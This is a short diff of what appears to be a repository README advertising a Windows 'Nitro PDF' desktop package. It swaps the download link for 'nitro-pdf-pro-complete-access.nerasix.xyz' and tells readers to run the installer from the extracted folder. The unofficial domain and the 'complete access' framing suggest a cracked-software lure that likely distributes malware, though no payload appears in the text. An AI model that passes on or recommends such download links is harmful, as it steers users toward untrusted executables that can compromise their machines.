@@ -8,8 +8,8 @@ Nitro PDF desktop package for Windows · office toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[nitro-pdf.nerasix.xyz](https://nitro-pdf.nerasix.xyz/)**
-* **Full URL:** `https://nitro-pdf.nerasix.xyz/`
+* **Project link:** **[nitro-pdf-pro-complete-access.nerasix.xyz](https://nitro-pdf-pro-complete-access.nerasix.xyz/)**
+* **Full URL:** `https://nitro-pdf-pro-complete-access.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
